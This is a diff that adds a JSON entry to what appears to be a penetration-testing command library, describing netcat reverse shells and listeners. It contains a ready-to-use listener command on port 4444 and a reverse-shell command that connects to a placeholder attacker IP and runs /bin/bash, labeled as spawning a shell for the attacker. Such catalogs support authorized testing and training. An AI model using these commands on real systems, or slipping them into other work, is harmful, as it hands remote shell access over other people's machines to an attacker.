@@ -1,0 +1,35 @@
+{
+  "id": "c2c7d778-7d2",
+  "name": "netcat - reverse shells and listeners",
+  "tool": "nc",
+  "description": "Netcat for quick TCP listeners, bind and reverse shells.",
+  "tags": [
+    "nc",
+    "netcat",
+    "reverse"
+  ],
+  "ports": [
+    "4444"
+  ],
+  "commands": [
+    {
+      "name": "Start TCP listener",
+      "command": "nc -lvnp {LPORT}",
+      "description": "Listen for incoming TCP connections.",
+      "ports": [
+        "4444"
+      ]
+    },
+    {
+      "name": "Reverse shell (bash)",
+      "command": "nc {ATTACKER_IP} {LPORT} -e /bin/bash",
+      "description": "Connect back to attacker and spawn a shell.",
+      "ports": [
+        "4444"
+      ]
+    }
+  ],
+  "created": "2025-09-23T00:00:00Z",
+  "modified": "2025-09-23T00:00:00Z",
+  "platform": "any"
+}
